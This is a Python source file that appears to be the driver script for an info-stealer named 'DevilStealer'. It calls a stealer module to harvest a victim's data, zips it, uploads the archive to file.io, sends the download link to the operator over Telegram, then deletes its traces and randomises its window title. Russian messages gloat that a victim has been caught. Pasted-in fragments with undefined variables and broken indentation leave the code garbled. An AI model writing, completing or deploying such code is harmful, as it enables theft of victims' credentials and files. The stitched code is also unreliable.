import os
import telebot
import requests
import stealer
from telebot import types
import string
import random
import logging

logging.basicConfig(level=logging.DEBUG)
response = requests.post(url, data=payload, timeout=30)
response = requests.post(url, data=payload, verify=False)

ADMIN_ID = "YOUR_TELEGRAM_ID" # Your telegram id
FILE_IO_API_URL = "https://file.io"

bot = telebot.TeleBot("YOUR_BOT_TOKEN") # Your bot token

rand_title = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
os.system(f"title {rand_title}")

def upload_to_fileio(archive_path):
    with open(archive_path, "rb") as file:
        response = requests.post(FILE_IO_API_URL, files={"file": file})
        response_data = response.json()
        file.close()
        return response_data.get("link")

def send_to_tg(archive_path):
    file_io_link = upload_to_fileio(archive_path)
    lnkkb = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton(text="😈 Скачать логи", url=file_io_link)
    lnkkb.add(btn)
    bot.send_message(ADMIN_ID, f"DevilStealer>>> АХХАХХАХ кто-то попался\nДанные были успешно украденны 😈!\nСкачайте логи по кнопке ниже", reply_markup=lnkkb)


def main():
    stealer.steal_all()
    arch = stealer.create_zip_archive()
    if arch:
        send_to_tg(stealer.ZIP_PATH)
        stealer.delFolder()
        bot.stop_polling()
        exit(0)
        from requests.exceptions import ConnectionError

try:
    response = requests.post(url, data=payload)
    response.raise_for_status()
except ConnectionError as e:
    print(f"Соединение прервано: {e}")
    # Логика повторного отправки или обработки ошибки
except requests.exceptions.Timeout:
    print("Запрос превысил время ожидания")

    from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

retry_strategy = Retry(
    total=3,
    backoff_factor=1,
    status_forcelist=[429, 500, 502, 503, 504],
)
adapter = HTTPAdapter(max_retries=retry_strategy)
session = requests.Session()
session.mount("http://", adapter)
session.mount("https://", adapter)


if __name__ == "__main__":
    main()
    bot.polling(none_stop=True)
